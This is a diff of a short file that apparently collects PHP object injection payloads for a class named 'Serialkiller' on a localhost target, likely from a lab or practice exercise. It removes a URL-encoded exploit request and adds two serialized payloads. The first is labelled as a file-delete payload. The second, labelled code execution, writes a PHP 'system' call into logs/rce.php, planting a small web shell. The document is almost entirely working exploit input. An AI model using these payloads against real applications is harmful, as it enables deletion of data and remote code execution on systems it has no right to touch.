@@ -1,1 +1,8 @@
-http://localhost/injection.php?data=O:12:%22Serialkiller%22:4:{s:24:%22%00Serialkiller%00cache_file%22;s:16:%22cache/john.cache%22;s:22:%22%00Serialkiller%00log_file%22;s:13:%22logs/john.php%22;s:21:%22%00Serialkiller%00content%22;s:26:%22%3C?php%20system(%27dir%20/b%27);%20?%3E%22;s:18:%22%00Serialkiller%00user%22;s:4:%22john%22;}
+File delete payload
+```
+O:12:"Serialkiller":4:{s:24:"%00Serialkiller%00cache_file";s:8:"test.txt";s:22:"%00Serialkiller%00log_file";s:13:"logs/john.log";s:21:"%00Serialkiller%00content";s:12:"Starting log";s:18:"%00Serialkiller%00user";s:4:"john";}
+```
+Code Execution payload
+```
+O:12:"Serialkiller":4:{s:24:"%00Serialkiller%00cache_file";s:16:"cache/john.cache";s:22:"%00Serialkiller%00log_file";s:12:"logs/rce.php";s:21:"%00Serialkiller%00content";s:28:"<?php system('dir C:\\'); ?>";s:18:"%00Serialkiller%00user";s:4:"john";}
+```
